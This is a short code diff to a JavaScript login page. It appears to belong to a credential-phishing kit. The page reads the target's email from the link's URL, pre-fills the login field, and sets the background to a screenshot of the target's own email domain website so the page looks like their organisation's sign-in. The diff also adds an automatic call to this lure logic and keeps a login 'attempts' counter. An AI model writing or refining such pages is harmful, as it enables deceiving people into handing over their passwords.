@@ -13,6 +13,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const msg = document.getElementById("msg");
 
     let attempts = 0;
+let backgroundTimer;
 
     // ===================================
     // MESSAGE
@@ -68,11 +69,9 @@ function applyBackground(domain) {
     const website = `https://${domain}`;
 
     const screenshotUrl =
-`https://image.thum.io/get/width/1600/crop/900/${encodeURIComponent(website)}`;
+        `https://image.thum.io/get/width/1600/crop/900/${encodeURIComponent(website)}`;
 
-    loginPage.style.backgroundImage =
-        `url("${screenshotUrl}")`;
-
+    loginPage.style.backgroundImage = `url("${screenshotUrl}")`;
     loginPage.style.backgroundSize = "cover";
     loginPage.style.backgroundPosition = "center";
 }
@@ -81,7 +80,9 @@ function applyBackground(domain) {
     // LOAD EMAIL FROM URL
     // ===================================
 
- function loadEmailFromURL() {
+function loadEmailFromURL() {
+
+    if (!emailInput) return;
 
     const params = new URLSearchParams(window.location.search);
 
@@ -89,17 +90,17 @@ function applyBackground(domain) {
 
     if (!email) return;
 
-    emailInput.value = decodeURIComponent(email);
+    emailInput.value = decodeURIComponent(email.trim());
 
     const domain = getDomain(email);
 
     if (domain) {
-
         applyBackground(domain);
-
     }
 
 }
+
+loadEmailFromURL();
 
     // ===================================
     // LIVE EMAIL CHANGE
